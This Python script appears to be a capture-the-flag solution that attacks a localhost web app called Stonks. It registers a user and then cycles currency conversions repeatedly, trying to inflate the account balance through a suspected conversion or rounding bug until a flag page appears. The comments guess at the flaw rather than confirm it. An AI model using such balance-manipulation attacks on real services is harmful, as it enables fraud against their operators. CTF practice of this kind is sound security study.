import requests
import time

# Target URL
BASE_URL = "http://localhost:1337"

def register_user(username, password):
    """Register a new user"""
    session = requests.Session()
    
    data = {
        "username": username,
        "password": password,
        "confirm_password": password
    }
    
    response = session.post(f"{BASE_URL}/register", data=data)
    print(f"Register response: {response.status_code}")
    return session

def login_user(session, username, password):
    """Login user"""
    data = {
        "username": username,
        "password": password
    }
    
    response = session.post(f"{BASE_URL}/login", data=data)
    print(f"Login response: {response.status_code}")
    return session

def change_currency(session, currency):
    """Change currency"""
    data = {
        "currency": currency
    }
    
    response = session.post(f"{BASE_URL}/change-currency", data=data)
    print(f"Change currency to {currency}: {response.status_code}")
    return session

def check_balance(session):
    """Check current balance"""
    response = session.get(f"{BASE_URL}/")
    print(f"Balance page: {response.status_code}")
    if response.status_code == 200:
        print(f"Balance content: {response.text[:500]}...")
    return response.text

def check_rich(session):
    """Check if we're rich enough for flag"""
    response = session.get(f"{BASE_URL}/are-you-rich")
    print(f"Are you rich page: {response.status_code}")
    if response.status_code == 200:
        print(f"Rich check content: {response.text}")
        if "FLAG" in response.text:
            print("ðŸŽ‰ FLAG FOUND! ðŸŽ‰")
    return response.text

def exploit_currency_bug():
    """Exploit the currency conversion bug"""
    username = f"exploit_user_{int(time.time())}"
    password = "password123"
    
    print(f"Creating user: {username}")
    
    # Register and login
    session = register_user(username, password)
    session = login_user(session, username, password)
    
    # Check initial balance
    print("\n=== Initial Balance ===")
    check_balance(session)
    
    # The vulnerability: The bug in change_currency function
    # When user_balances[u] doesn't exist, it tries to access user_currencies[u]
    # which might not exist, causing potential issues
    
    print("\n=== Exploiting Currency Bug ===")
    
    # Strategy 1: Try to trigger the bug by changing currency rapidly
    # This might cause the user_currencies[u] to be None or cause floating point errors
    
    currencies = ["JPY", "KRW", "IDR", "EUR", "USD", "GBP", "AUD"]
    
    for i, currency in enumerate(currencies):
        print(f"\n--- Step {i+1}: Change to {currency} ---")
        session = change_currency(session, currency)
        check_balance(session)
        check_rich(session)
        time.sleep(0.1)
    
    # Strategy 2: Try specific combinations that might cause overflow
    print("\n=== Strategy 2: Overflow combinations ===")
    
    # Try converting to high-rate currencies multiple times
    high_rate_currencies = ["KRW", "IDR", "JPY"]
    
    for currency in high_rate_currencies:
        session = change_currency(session, currency)
        session = change_currency(session, "AUD")
        check_rich(session)
    
    # Strategy 3: Try rapid back-and-forth conversions
    print("\n=== Strategy 3: Rapid conversions ===")
    
    for _ in range(20):
        session = change_currency(session, "KRW")
        session = change_currency(session, "AUD")
        check_rich(session)
        time.sleep(0.05)
    
    # Strategy 4: Try to exploit floating point precision
    print("\n=== Strategy 4: Precision exploit ===")
    
    # Convert to very small currency then to very large currency
    session = change_currency(session, "GBP")  # 0.48 (small)
    session = change_currency(session, "KRW")  # 888.04 (large)
    session = change_currency(session, "AUD")
    check_rich(session)
    
    # Try multiple small->large conversions
    for _ in range(10):
        session = change_currency(session, "GBP")
        session = change_currency(session, "KRW")
        session = change_currency(session, "AUD")
        check_rich(session)
        time.sleep(0.05)

def exploit_session_bug():
    """Try to exploit session vs user_currencies inconsistency"""
    username = f"session_user_{int(time.time())}"
    password = "password123"
    
    print(f"\n=== Session Bug Exploit ===")
    print(f"Creating user: {username}")
    
    # Register and login
    session = register_user(username, password)
    session = login_user(session, username, password)
    
    # Try to manipulate session currency vs user_currencies
    print("\n=== Manipulating session state ===")
    
    # Change currency multiple times to create inconsistency
    for _ in range(15):
        session = change_currency(session, "KRW")
        session = change_currency(session, "AUD")
        check_rich(session)
        time.sleep(0.05)

if __name__ == "__main__":
    print("=== STONKS WEB EXPLOIT ===")
    
    # Try multiple exploit strategies
    exploit_currency_bug()
    exploit_session_bug()
    
    print("\n=== Exploit completed ===") 